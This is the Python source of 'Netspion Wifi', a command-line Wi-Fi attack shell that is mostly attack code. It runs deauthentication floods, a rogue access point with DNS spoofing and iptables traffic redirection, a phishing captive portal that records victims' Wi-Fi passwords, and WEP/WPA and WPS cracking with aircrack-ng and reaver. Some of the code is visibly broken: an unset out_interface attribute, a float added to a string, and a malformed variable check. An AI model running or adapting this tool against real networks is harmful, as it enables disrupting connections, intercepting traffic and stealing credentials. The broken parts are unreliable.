import cmd2, platform, os, time
import utils.run_task as rt
from cmd2 import with_default_category
import utils.string_format as sf
from utils.check_var import check_vars
from utils.utils_shell import UtilsCommandSet

PLATFORM_SYSTEM = platform.system()


@with_default_category("Main commands")
class WifiShell(cmd2.Cmd):
    intro = sf.text(
        "Netspion Wifi Sub menu. Type help or ? to list commands and help/? COMMAND to show COMMAND help. \n"
    )
    prompt = sf.success("(netspion Wifi): ")

    def __init__(self):
        super().__init__(auto_load_commands=False)
        self.resultsPath = "/tmp/netspion/Wifi/"
        self.adapter = self.masq_interface = self.wpa_type = self.wordfile = (
            self.wifi_bssid
        ) = self.channel = self.device_bssid = self.capfile = self.ap_adapter = (
            self.ssid
        ) = self.ap_channel = ""
        self.add_settable(cmd2.Settable("adapter", str, "Wifi adapter name", self))
        self.add_settable(
            cmd2.Settable(
                "masq_interface", str, "Interface name to masquerade traffic", self
            )
        )
        self.add_settable(
            cmd2.Settable(
                "wpa_type", str, "Wifi Password Type: WEP (1) / WPA-PSK(2)", self
            )
        )
        self.add_settable(
            cmd2.Settable(
                "capfile",
                str,
                ".cap file path",
                self,
                completer=cmd2.Cmd.path_complete,
            )
        )
        self.add_settable(
            cmd2.Settable(
                "wordfile",
                str,
                "Wordfile file path",
                self,
                completer=cmd2.Cmd.path_complete,
            )
        )
        self.add_settable(cmd2.Settable("wifi_bssid", str, "Target Wifi BSSID", self))
        self.add_settable(cmd2.Settable("channel", str, "Target Wifi Channel", self))
        self.add_settable(
            cmd2.Settable("device_bssid", str, "Target Device BSSID", self)
        )
        self.add_settable(cmd2.Settable("ap_adapter", str, "Adapter name for AP", self))
        self.add_settable(cmd2.Settable("ssid", str, "Wifi SSID for AP", self))
        self.add_settable(
            cmd2.Settable("ap_channel", str, "Channel number for AP", self)
        )
        self.register_command_set(UtilsCommandSet())
        self.default_category = "cmd2 Built-in Commands"
        self.remove_settable("debug")
        self.remove_settable("allow_style")
        self.remove_settable("always_show_hint")
        self.remove_settable("echo")
        self.remove_settable("feedback_to_output")
        self.remove_settable("max_completion_items")
        self.remove_settable("quiet")
        self.remove_settable("timing")
        self.poutput(
            sf.info("RUNNING ON: ")
            + sf.success(PLATFORM_SYSTEM + platform.release() + platform.version())
        )
        self.poutput(
            sf.info("ALL RESULTS WILL BE STORED IN: ") + sf.success(self.resultsPath)
        )
        os.makedirs(self.resultsPath, exist_ok=True)
        if os.path.isfile(self.resultsPath + "saved.conf"):
            reload = str(
                input("Saved config exists. Do you want to reload it? [y/n]: ")
            )
            if reload == "Y" or reload == "y":
                (
                    adapter,
                    wifi_bssid,
                    channel,
                    device_bssid,
                    capfile,
                    ap_adapter,
                    ssid,
                    ap_channel,
                ) = self.reloadConf()
        self.do_help("-v")

    def makeDNSMasqConf(self):
        dnsmasqConf = open(self.resultsPath + "dnsmasq.conf", "w")
        # Make cfgs
        dnsmasqConf.write(
            f"""interface={self.ap_adapter}
dhcp-range=192.168.2.2,192.168.2.230,255.255.255.0,12h
dhcp-option=3,192.168.2.1
dhcp-option=6,192.168.2.1
no-hosts
addn-hosts={self.resultsPath}hosts
no-resolv
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
listen-address=192.168.2.1"""
        )
        dnsmasqConf.close()

    def makeHostapdConf(self):
        hostapdConf = open(self.resultsPath + "hostapd.conf", "w")
        hostapdConf.write(
            f"""interface={self.ap_adapter}
driver=nl80211
ssid={self.ssid}
hw_mode=g
channel={self.ap_channel}
macaddr_acl=0
ignore_broadcast_ssid=0"""
        )
        hostapdConf.close()

    def setFirewallRules(self):
        rt.normalCapture(
            f"ifconfig {self.ap_adapter} up 192.168.2.1 netmask 255.255.255.0;\
            route add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1;\
            iptables-save > {self.resultsPath}iptables.bkp;\
            iptables --flush;\
            iptables --table nat --flush;\
            iptables --delete-chain;\
            iptables --table nat --delete-chain;\
            iptables --table nat --append POSTROUTING --out-interface={self.out_interface} -j MASQUERADE;\
            iptables --append FORWARD --in-interface {self.ap_adapter} -j ACCEPT;\
            echo 1 > /proc/sys/net/ipv4/ip_forward;\
            iptables -A INPUT -p tcp --dport 443 -j ACCEPT;\
            iptables -A INPUT -p tcp --dport 80 -j ACCEPT;\
            iptables -A INPUT -p udp --dport 53 -j ACCEPT;\
            iptables -A INPUT -p udp --dport 67 -j ACCEPT;\
            iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.2.1:80;\
            iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.2.1:443"
        )

    def reloadConf(self):
        file = open(self.resultsPath + "saved.conf", "r")
        dict = {}
        for line in file.read().splitlines():
            string = line.split("=")
            dict.update({string[0]: string[1].strip()})
        self.adapter = dict["adapter"]
        self.wifi_bssid = dict["wifi_bssid"]
        self.channel = dict["channel"]
        self.device_bssid = dict["device_bssid"]
        self.capfile = dict["capfile"]
        self.ap_adapter = dict["ap_adapter"]
        self.ssid = dict["ssid"]
        self.ap_channel = dict["ap_channel"]
        return (
            self.adapter,
            self.wifi_bssid,
            self.channel,
            self.device_bssid,
            self.capfile,
            self.ap_adapter,
            self.ssid,
            self.ap_channel,
        )

    def do_deAuthAttack(self, arg):
        "Start de-authentication attack"
        if check_vars(
            [
                {"name": "wifi_bssid", "value": self.wifi_bssid},
                {"name": "adapter", "value": self.adapter},
            ]
        ):
            if self.device_bssid:
                rt.runBackground(
                    [
                        "aireplay-ng",
                        "-0",
                        "0",
                        "-a",
                        self.wifi_bssid,
                        "-c",
                        self.device_bssid,
                        self.adapter,
                    ],
                    None,
                )
            else:
                rt.runBackground(
                    [
                        "aireplay-ng",
                        "-0",
                        "0",
                        "-a",
                        self.wifi_bssid,
                        self.adapter,
                    ],
                    None,
                )

    def do_rogueAPAttack(self, arg):
        "Start Rogue AP"
        if check_vars(
            [
                {"name": "ssid", "value": self.ssid},
                {"name": "ap_channel", "value": self.ap_channel},
                {"name": "ap_adapter", "value": self.ap_adapter},
            ]
        ):
            out_interface = str(input("Output interface to masquerade traffic: "))
            self.makeDNSMasqConf()
            self.makeHostapdConf()
            # Start AP
            rt.runBackground(
                [
                    "hostapd",
                    self.resultsPath + "hostapd.conf",
                ],
                None,
            )
            # Start DNS spoof & DHCP
            rt.runBackground(
                [
                    "dnsmasq",
                    "-C",
                    self.resultsPath + "dnsmasq.conf",
                    "-d",
                ],
                None,
            )
            # Set Firewall rules and network
            self.setFirewallRules()
            # CP tmp Hosts file to be used with DNS spoof
            rt.normalCapture(f"cp ./EthicalHacking/Wifi/hosts {self.resultsPath}")

    def do_cpAttack(self, arg):
        "Start Captive Portal"
        if check_vars([{"name": "ssid", "value": self.ssid}]):
            # Copy cfgs to tmp folder
            rt.normalCapture(
                [
                    "cp",
                    "-Rv",
                    "./Wifi/captive_portal",
                    self.resultsPath,
                ]
            )
            rt.normalCapture(
                ["chmod", "-R", "777", self.resultsPath + "captive_portal"]
            )

            print(sf.info("Portals Availables"))
            rt.normalShell(
                f"ls -l {self.resultsPath}captive_portal/portals | grep '^d' | cut -d ' ' -f9"
            )
            portal = str(input("\nSelect a portal name: "))

            rt.normalCapture(
                [
                    "sed",
                    "-i",
                    f"s/WIFI_SSID/{self.ssid}/g",
                    f"{self.resultsPath}captive_portal/portals/{portal}/index.html",
                ]
            )

            rt.normalCapture(
                [
                    "cp",
                    "./Wifi/captive_portal/check.php",
                    f"{self.resultsPath}captive_portal/portals/{portal}",
                ]
            )

            rt.normalCapture(
                [
                    "sed",
                    "-i",
                    f"s+CAP_FILE_PATH+{self.capfile}+g",
                    f"{self.resultsPath}captive_portal/portals/{portal}/check.php",
                ]
            )

            rt.normalCapture(
                [
                    "sed",
                    "-i",
                    f"s/WIFI_SSID/{self.ssid}/g",
                    f"{self.resultsPath}captive_portal/portals/{portal}/check.php",
                ]
            )

            rt.normalCapture(
                [
                    "sed",
                    "-i",
                    f"s/PORTAL_ROOT/{portal}/g",
                    f"{self.resultsPath}captive_portal/lighttpd.conf",
                ]
            )
            # Start Web server
            rt.runBackground(
                [
                    "lighttpd",
                    "-D",
                    "-f",
                    self.resultsPath + "captive_portal/lighttpd.conf",
                ],
                None,
            )
            # Monitor password hit
            rt.runBackground(
                ["tail", "-f", self.resultsPath + "captive_portal/hit.txt"], None
            )

    def do_monitor_mode(self, arg):
        "Set adapter to monitor mode"
        if check_vars([{"name": "adapter", "value": self.adapter}]):
            rt.runBackground(["airmon-ng", "start", self.adapter], None)
            # self.adapter = self.adapter + "mon"

    def do_show_wifis(self, arg):
        "Show available wifis"
        if check_vars([{"name": "adapter", "value": self.adapter}]):
            rt.runBackground(
                [
                    "airodump-ng",
                    "--band",
                    "abg",
                    self.adapter,
                    "-w",
                    self.resultsPath + "availableWifis",
                ],
                None,
            )

    def do_wifi_monitor(self, arg):
        "Monitor selected Wifi"
        if check_vars(
            [
                {
                    "name": "channel",
                    "value": self.channel,
                    "name": "wifi_bssid",
                    "value": self.wifi_bssid,
                }
            ]
        ):
            output_file = self.resultsPath + self.wifi_bssid + time.time()
            rt.runBackground(
                [
                    "airodump-ng",
                    "--band",
                    "abg",
                    "-c",
                    self.channel,
                    "--bssid",
                    self.wifi_bssid,
                    "-w",
                    output_file,
                    self.adapter,
                ],
                None,
            )
            self.capfile = output_file + ".cap"

    def do_wifi_passw_crack(self, arg):
        "Wifi password crack"
        if check_vars(
            [
                {"name": "wpa_type", "value": self.wpa_type},
                {"name": "wordfile", "value": self.wordfile},
                {"name": "capfile", "value": self.capfile},
            ]
        ):
            if self.wpa_type == 1:
                rt.runBackground(
                    [
                        "aircrack-ng",
                        "-a1",
                        "-b",
                        self.wifi_bssid,
                        "-w",
                        self.wordfile,
                        self.capfile,
                    ],
                    None,
                )
            elif self.wpa_type == 2:
                rt.runBackground(
                    [
                        "aircrack-ng",
                        "-a2",
                        "-b",
                        self.wifi_bssid,
                        "-w",
                        self.wordfile,
                        self.capfile,
                    ],
                    None,
                )
            else:
                print("Invalid password type")

    def do_wps_show(self, arg):
        "Show available WPS"
        if check_vars([{"name": "adapter", "value": self.adapter}]):
            rt.runBackground(
                [
                    "wash",
                    "-i",
                    self.adapter,
                    "-O",
                    self.resultsPath + "WPS_scan",
                ],
                None,
            )

    def do_wps_crack(self, arg):
        "WPS crack"
        if check_vars(
            [
                {"name": "adapter", "value": self.adapter},
                {"name": "wifi_bssid", "value": self.wifi_bssid},
                {"name": "channel", "value": self.channel},
            ]
        ):
            rt.runBackground(
                [
                    "reaver",
                    "-i",
                    self.adapter,
                    "-b",
                    self.wifi_bssid,
                    "-c",
                    self.channel,
                    "-O",
                    self.resultsPath + "_WPSCrack",
                ],
                None,
            )


def main():
    WifiShell().do_clear(1)
    WifiShell().cmdloop()
